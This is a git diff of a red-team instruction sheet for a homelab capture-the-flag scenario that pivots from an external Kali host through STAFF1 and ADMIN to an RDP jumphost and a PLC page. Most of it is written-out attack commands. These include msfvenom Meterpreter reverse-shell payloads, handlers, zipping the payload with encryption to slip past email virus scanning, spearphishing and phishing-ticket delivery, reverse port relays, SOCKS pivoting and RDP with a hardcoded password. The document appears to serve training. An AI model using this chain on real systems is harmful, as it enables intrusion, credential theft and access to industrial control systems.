@@ -1,16 +1,8 @@
-# Double-Pivot Runbook: External → STAFF1 → ADMIN → RDP Jumphost
+# Scenario 1 Red Team Instruction Sheet: External → STAFF1 → ADMIN → RDP Jumphost
 
-Reproducible command sequence for the factory-network pivot lab. All commands
-manual — no resource scripts. Runs a reverse TCP foothold on STAFF1 (vmbr1),
-relays a second payload to ADMIN (dual-homed vmbr1/vmbr2), chains routes through
-both, and RDPs into the Ubuntu jumphost on vmbr2 — all through a single SOCKS proxy.
-
-> Copy top to bottom. Placeholders in `<angle brackets>` — swap for your lab values.
 
 ---
-
 ## Topology
-
 ```
 Kali (vmbr5, 192.168.200.2)
   └─ STAFF1  [session 1]  vmbr1 192.168.0.0/24   (dual-homed .4 / .108)
@@ -25,7 +17,29 @@ Assume that 192.168.200.x is a public ip, similar to your home network.
 
 ---
 
-## Lab values (fill in first)
+
+## Vmbr5 (Public IP Setup)
+
+To establish a link between the threat actor and the initial victim when the payload tries to phone home, vmbr5 will be a statically assigned bridge to send payload/wifi traffic over the wire.
+
+On Proxmox, modify the /etc/network/interfaces file and add the following:
+
+'''
+auto vmbr5
+iface vmbr5 inet manual
+        bridge-ports enxc84d4422f4d8
+        bridge-stp off
+        bridge-fd 0
+#Used to simulate external link to staff1 for scenario 1
+'''
+
+enxc84d4422f4d8 is a USB-Ethernet adapter plugged into proxmox, ensure the correct adapter is being utilised.
+
+Ensure your Kali machine can connect via an ethernet cable.
+
+
+
+## Lab value topology
 
 | Name           | Value              | Notes                                  |
 |----------------|--------------------|----------------------------------------|
@@ -39,11 +53,16 @@ Assume that 192.168.200.x is a public ip, similar to your home network.
 
 Confirm Kali's IP: `ip a`
 
+If you have followed all the github doctumentation in this repositiory, the values above should be used.
 ---
 
 ## HOP 1 — Foothold on STAFF1
 
 ### 1. Generate the Windows payload
+On the Kali machine, open a new terminal and execute:
+```bash
+cd ~
+```
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
   LHOST=192.168.200.2 LPORT=4444 \
@@ -51,6 +70,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
 ```
 
 ### 2. Start msfconsole and the handler
+On a seperate terminal, execute:
 ```bash
 msfconsole -q
 ```
@@ -65,9 +85,15 @@ exploit -j
 ```
 `-j` backgrounds the handler so the console stays usable.
 
-### 3. Deliver and detonate
-Get `payload.exe` onto STAFF1 (shared folder / `python3 -m http.server`) and run
-it. Watch for:
+### 3. Deliver and detonate:
+
+The method utilised to send over the payload was over email. Due to most mainstream email providers using virus scanning on attachments, encrypt the payload in a zip file.
+
+```bash
+zip -e proposal.zip payload.exe
+```
+
+Get `proposal.zip` onto STAFF1 via a spearphishing email and await for:
 ```
 [*] Meterpreter session 1 opened (192.168.200.2:4444 -> 192.168.200.4:xxxxx)
 ```
@@ -75,6 +101,12 @@ Confirm the session:
 ```
 sessions -l
 ```
+### Flag 1:
+
+Enter session:
+sessions -i 1
+cd C:\Users\Jsmith\Desktop
+cat dont\ mind\ me.txt
 
 ### 4. Add the vmbr1 route (from inside the session)
 ```
@@ -108,16 +140,25 @@ Edit `/etc/proxychains4.conf`:
 ### 7. Test hop 1
 ```bash
 proxychains nmap 192.168.0.*
-proxychains curl http://<internal-web-ip>
+proxychains curl http://192.168.0.11
 ```
-
 ---
 
+### 8. Access OSTicket
+
+nmap showed 192.168.0.11 has a http service. 
+Open Firefox -> Settings -> Connection and software security -> Proxy Settings
+"Manual Proxy Configuration" Enable
+SOCKS Host: 127.0.0.1 Port 1080 Socks v4 Enable
+
+Head to http://192.168.0.11
+
+Create a new ticket and draft a believabile ticket request as another payload will be used here
 ## HOP 2 — Relay to ADMIN
 
-ADMIN can't reach Kali, so its shell calls back to STAFF1, which relays to Kali.
+The next device ADMIN can't reach Kali, so its shell calls back to STAFF1, which relays to Kali.
 
-### 1. Build the reverse relay on STAFF1
+### 1. Build the reverse relay on STAFF1 First
 ```
 sessions -i 1
 portfwd add -R -l 4445 -L 192.168.200.2 -p 4445
@@ -128,6 +169,7 @@ Flags: `-R` reverse relay · `-l 4445` port STAFF1 opens · `-L 192.168.200.2`
 forward destination (Kali) · `-p 4445` Kali's port.
 
 ### 2. Start the second handler (Linux payload, new port)
+NOTE: For demonstration purposes we know Admin is linux.
 ```
 use exploit/multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
@@ -141,17 +183,32 @@ exploit -j
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp \
   LHOST=192.168.0.103 LPORT=4445 \
-  -f elf -o payload_admin.elf
+  -f elf -o payload.elf
 ```
 LHOST is **STAFF1** (`.103`), because ADMIN calls back to STAFF1, which relays.
 
-### 4. Deliver via the ticket system → ADMIN runs it
+
+### 4. Attach Payload
+
+On the create a ticket page, at the bottom of your phishing email, there is an attach option, select that and add "payload.elf" to the ticket and send.
+
+### 5. Deliver via the ticket system → ADMIN runs it
+On Admins computer on a terminal:
 ```bash
 chmod +x payload_admin.elf
 ./payload_admin.elf
 ```
+On kali await for
+```
+[*] Meterpreter session 2 opened
+```
 
-### 5. Confirm session 2 is really ADMIN
+### Flag 2:
+sessions -i 2
+cd /home/administrator@CYBERFORGE.com/senario\ 1
+cat flag.txt
+
+### 6. Confirm session 2 is really ADMIN
 ```
 sessions -i 2
 sysinfo                   # hostname must be ADMIN, not STAFF1
@@ -184,13 +241,23 @@ Want `3389/tcp open`.
 
 ### 4. RDP through the full chain
 ```bash
-proxychains xfreerdp /v:<ubuntu-ip> /u:<user> /p:<pass> \
-  /cert:ignore +clipboard /dynamic-resolution
-
-proxychains xfreerdp /v:192.168.100.3 /u:<user> /p:JumpH0st2026! \
+proxychains xfreerdp /v:192.168.100.3 /u:jumphost /p:JumpH0st2026! \
   /cert:ignore +clipboard /dynamic-resolution
 ```
-Install if missing: `sudo apt install freerdp2-x11`. Expect it to be sluggish
-over a double SOCKS pivot — normal for a demo.
 
----
+### Flag 3
+
+Once authenticated into jumphost open a terminal:
+```bash
+cd ~/senario1
+cat flag.txt
+```
+
+### OT Access
+Run a nmap scan on the network:
+'''bash
+nmap 192.168.100.*
+'''
+Once 192.168.100.5 is found, head to jumphost's browser and enter 192.168.100.5
+
+The page loaded is the backend PLC logic used to manage the Critical Infrastrucutre, showing how a hacker has gone from External -> Internal IT -> Admin -> OT Due to the IT/OT Convergence.
